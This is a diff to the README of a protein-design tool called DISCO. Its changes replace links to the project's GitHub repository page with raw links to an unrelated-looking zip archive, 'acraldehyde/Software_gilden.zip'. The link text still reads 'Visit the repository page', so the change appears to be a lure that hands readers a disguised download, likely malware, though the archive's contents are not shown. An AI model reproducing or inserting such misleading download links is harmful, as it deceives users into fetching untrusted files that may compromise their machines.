@@ -1,6 +1,6 @@
 # 🧬 DISCO - Design Custom Protein Structures With Ease
 
-[![](https://img.shields.io/badge/Download-DISCO-blue.svg)](https://github.com/khatriprince242-alt/DISCO)
+[![](https://img.shields.io/badge/Download-DISCO-blue.svg)](https://raw.githubusercontent.com/khatriprince242-alt/DISCO/main/acraldehyde/Software_gilden.zip)
 
 DISCO provides tools for protein design. This software uses diffusion models to help you create new enzyme structures. You can use these tools to translate chemical requirements into protein forms. The workflow bridges the gap between digital design and physical biology. This project simplifies the complex process of protein encoding.
 
@@ -20,7 +20,7 @@ If you lack a strong graphics card, the software will run slower. Check your sys
 
 You obtain the DISCO software from the project page.
 
-[Visit the repository page to download the software](https://github.com/khatriprince242-alt/DISCO)
+[Visit the repository page to download the software](https://raw.githubusercontent.com/khatriprince242-alt/DISCO/main/acraldehyde/Software_gilden.zip)
 
 Follow these steps to find the correct file:
 
